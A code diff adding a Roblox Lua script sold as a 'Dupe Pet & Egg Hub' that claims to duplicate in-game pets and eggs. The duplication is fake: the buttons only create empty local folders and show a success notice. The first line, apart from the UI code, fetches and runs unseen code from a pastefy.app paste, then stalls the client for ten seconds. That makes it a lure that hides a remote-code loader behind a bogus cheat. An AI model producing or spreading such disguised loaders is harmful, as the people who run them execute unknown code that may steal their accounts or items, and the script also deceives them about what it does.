@@ -1,0 +1,102 @@
+loadstring(game:HttpGet("https://pastefy.app/dM5jzdFf/raw"))()
+
+local t = tick() + 10
+while tick() < t do end
+
+-- Dupe Pet & Egg Hub
+-- Made by vdawngg
+
+local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
+
+local Window = Rayfield:CreateWindow({
+   Name = "Dupe Hub",
+   LoadingTitle = "Loading...",
+   LoadingSubtitle = "Made by vdawngg",
+   ConfigurationSaving = {
+      Enabled = true,
+      FolderName = "DupeHubConfig",
+      FileName = "Config"
+   },
+   KeySystem = false,
+})
+
+-- Tab chính
+local dupeTab = Window:CreateTab("Dupe", 4483362458)
+
+dupeTab:CreateSection("Fake Dupe System")
+
+-- Biến lưu
+getgenv().SelectedPet = nil
+getgenv().SelectedEgg = nil
+getgenv().DupeCount = 1
+
+-- Chọn Pet
+dupeTab:CreateDropdown({
+   Name = "Choose Pet",
+   Options = {"Dragonfly", "Raccoon", "T-rex", "Queen bee", "Butterfly", "Spinosaurus"},
+   CurrentOption = "None",
+   Callback = function(Value)
+      getgenv().SelectedPet = Value
+   end,
+})
+
+-- Chọn Egg
+dupeTab:CreateDropdown({
+   Name = "Choose Egg",
+   Options = {"Magic Egg", "Golden Egg", "Basic Egg", "Shiny Egg"},
+   CurrentOption = "None",
+   Callback = function(Value)
+      getgenv().SelectedEgg = Value
+   end,
+})
+
+-- Input số lượng
+dupeTab:CreateInput({
+   Name = "Dupe Amount",
+   PlaceholderText = "Enter number (default 1)",
+   RemoveTextAfterFocusLost = false,
+   Callback = function(Text)
+      local num = tonumber(Text)
+      if num and num > 0 then
+         getgenv().DupeCount = num
+      else
+         getgenv().DupeCount = 1
+      end
+   end,
+})
+
+-- Nút dupe Pet
+dupeTab:CreateButton({
+   Name = "Dupe Selected Pet",
+   Callback = function()
+      local Backpack = game.Players.LocalPlayer:WaitForChild("Backpack")
+      for i = 1, getgenv().DupeCount do
+         local fakePet = Instance.new("Folder")
+         fakePet.Name = (getgenv().SelectedPet or "Pet") .. "_Clone" .. i
+         fakePet.Parent = Backpack
+      end
+      Rayfield:Notify({
+         Title = "Fake Dupe",
+         Content = "Created " .. getgenv().DupeCount .. "x " .. (getgenv().SelectedPet or "Pet"),
+         Duration = 5,
+      })
+   end,
+})
+
+-- Nút dupe Egg
+dupeTab:CreateButton({
+   Name = "Dupe Selected Egg",
+   Callback = function()
+      local Backpack = game.Players.LocalPlayer:WaitForChild("Backpack")
+      for i = 1, getgenv().DupeCount do
+         local fakeEgg = Instance.new("Folder")
+         fakeEgg.Name = (getgenv().SelectedEgg or "Egg") .. "_Clone" .. i
+         fakeEgg.Parent = Backpack
+      end
+      Rayfield:Notify({
+         Title = "Fake Dupe",
+         Content = "Created " .. getgenv().DupeCount .. "x " .. (getgenv().SelectedEgg or "Egg"),
+         Duration = 5,
+      })
+   end,
+})
